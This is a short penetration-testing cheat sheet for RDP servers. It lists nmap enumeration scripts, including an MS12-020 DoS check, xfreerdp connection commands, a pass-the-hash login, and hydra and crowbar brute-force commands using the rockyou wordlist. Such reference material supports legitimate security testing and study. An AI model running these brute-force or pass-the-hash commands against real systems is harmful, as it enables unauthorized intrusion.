---
title: "RDP"
description: "Enumeration, exploitation and post-exploitation techniques for RDP servers."
tags: ["rdp", "network", "service"]
publishDate: 2026-05-04
---

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->

- [Enumeration](#enumeration)
  - [Banner grabbing](#banner-grabbing)
- [Connect](#connect)
- [Brute Force](#brute-force)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

RDP (Remote Desktop Protocol) runs on **port 3389** and provides a graphical remote session.
Common on Windows servers and workstations.

## Enumeration

### Banner grabbing

```bash
nmap -sV -p 3389 $IP
nmap -p 3389 --script rdp-* $IP
```

Key scripts:

- `rdp-enum-encryption`: checks encryption level
- `rdp-vuln-ms12-020`: tests for MS12-020 DoS vulnerability

## Connect

```bash
xfreerdp /u:$user /p:$password /v:$IP
xfreerdp /u:$user /p:$password /v:$IP /cert:ignore
rdesktop $IP
```

Pass the hash directly (no plaintext password needed):

```bash
xfreerdp /u:$user /pth:$hash /v:$IP
```

## Brute Force

```bash
hydra -l $user -P ~/wordlists/rockyou.txt rdp://$IP
crowbar -b rdp -s $IP/32 -u $user -C ~/wordlists/rockyou.txt
```
